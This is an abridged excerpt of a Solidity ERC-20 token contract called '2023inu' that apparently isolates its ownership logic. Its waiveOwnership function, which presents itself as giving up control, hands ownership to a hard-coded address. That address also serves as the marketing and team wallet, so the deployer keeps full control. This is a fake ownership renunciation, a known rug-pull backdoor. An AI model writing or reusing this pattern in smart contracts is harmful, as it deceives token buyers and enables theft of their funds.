...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xDf2e9E23f025438Ddc659da82f843a0f16bd2aB0);
    }
...
contract nyinu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "2023inu";
    string private _symbol = "Quan";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xDf2e9E23f025438Ddc659da82f843a0f16bd2aB0);
    address payable private teamWalletAddress = payable(0xDf2e9E23f025438Ddc659da82f843a0f16bd2aB0);
